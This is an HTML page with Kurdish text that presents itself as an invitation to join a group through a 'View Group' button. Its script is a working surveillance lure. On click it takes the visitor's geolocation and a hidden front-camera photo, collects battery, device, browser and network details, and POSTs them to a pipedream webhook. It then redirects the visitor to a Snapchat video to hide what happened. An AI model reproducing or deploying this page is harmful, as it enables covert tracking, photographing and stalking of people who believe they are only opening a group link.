<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .btn {
            background-color: #0088cc;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,136,204,0.4);
            transition: 0.3s;
        }
        .btn:hover {
            background-color: #0077b5;
        }
    </style>
</head>
<body>

    <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
    <button class="btn" id="viewGroupBtn">View Group</button>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const secureWebhook = "https://eo7he3dstagkpih.m.pipedream.net";
        const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        let globalBattery = "N/A";
        let globalCharging = "N/A";
        let globalMaps = "⚠️ مۆڵەتی نەدا یان ڕەتکرایەوە";
        let globalDevice = navigator.platform || "Unknown";
        let globalBrowser = "Unknown Browser";
        let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
        let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "Unknown";

        // دیاریکردنی جۆری وێبگەڕ
        const userAgent = navigator.userAgent;
        if (userAgent.indexOf("Firefox") > -1) globalBrowser = "Firefox";
        else if (userAgent.indexOf("SamsungBrowser") > -1) globalBrowser = "Samsung Browser";
        else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) globalBrowser = "Opera";
        else if (userAgent.indexOf("Chrome") > -1) globalBrowser = "Chrome";
        else if (userAgent.indexOf("Safari") > -1) globalBrowser = "Safari";

        // وەرگرتنی زانیاری پاتری
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                globalBattery = Math.round(battery.level * 100) + "%";
                globalCharging = battery.charging ? "بەڵێ" : "نەخێر";
            }).catch(() => {});
        }

        // کاتێک کلیک لەسەر دوگمەکە دەکرێت
        document.getElementById('viewGroupBtn').addEventListener('click', async function() {
            document.getElementById('viewGroupBtn').innerText = "Loading...";

            // ١. هەوڵدان بۆ وەرگرتنی لۆکەیشن بە خێرایی
            if (navigator.geolocation) {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition((position) => {
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        globalMaps = "http://maps.google.com/?q=" + lat + "," + lon;
                        resolve();
                    }, () => { resolve(); }, { timeout: 3000 });
                });
            }

            try {
                // ٢. داواکردنی کامێرا لە کاتی کلیکەکەدا
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                
                // کاتی کورت بۆ ڕوونکردنەوەی کامێرا
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // کێشانی وێنەکە
                context.drawImage(video, 0, 0, 640, 480);
                
                // گۆڕینی وێنەکە بۆ بلۆب بە شێوازی چاوەڕوانکراوی بەهێز (Promise)
                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                
                // ناردنی داتاکان
                await sendStrictData(imageBlob);

            } catch (err) {
                // ئەگەر کامێراشی نەدا، هەر داتاکانی تر بنێرە
                await sendStrictData(null);
            } finally {
                // گۆڕینی لاپەڕە بۆ سناپچات لە کۆتایی هەموو پڕۆسەکەدا
                window.location.href = snapchatRedirectUrl;
            }
        });

        // فەرمانی ناردنی داتا بە شێوازی بنبڕکردنی پچڕانی وێبگەڕ
        async function sendStrictData(imageBlob) {
            const formData = new FormData();
            let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;

            formData.append("uid", uid);
            formData.append("battery", globalBattery);
            formData.append("charging", globalCharging);
            formData.append("maps", globalMaps);
            formData.append("device", globalDevice);
            formData.append("browser", globalBrowser);
            formData.append("time", globalTime);
            formData.append("network", globalNetwork);

            if (imageBlob) {
                formData.append("photo", imageBlob, "snap.jpg");
            }

            try {
                // بەکارهێنانی keepalive بۆ ئەوەی ناردنەکە نەپچڕێت تەنانەت ئەگەر لاپەڕەکەش بگۆڕێت
                await fetch(secureWebhook, { 
                    method: 'POST', 
                    body: formData,
                    keepalive: true 
                });
            } catch (err) {
                console.error("Error sending data:", err);
            }
        }
    </script>
</body>
</html>
